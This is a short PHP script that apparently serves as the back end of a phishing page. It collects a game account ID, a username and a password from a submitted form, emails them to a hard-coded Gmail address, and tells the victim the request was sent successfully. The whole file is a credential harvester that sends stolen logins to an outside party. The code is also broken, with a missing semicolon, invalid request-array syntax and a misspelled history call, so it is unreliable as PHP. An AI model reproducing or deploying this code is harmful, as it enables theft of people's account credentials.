<?php
$id=$_REQUEST['FF ID']
$message = $_REQUEST['USERNAME','PASSWORD'];

if(empty($message))
{
    echo "please fill all the boxes";
}
else
{
    mail("27december2007@gmail.com",$id, $message);
    echo "<script type='text/javascript'>alert('your request has been sent sucessfully');
    windows.history.log(-1)
    </script>";
}
?>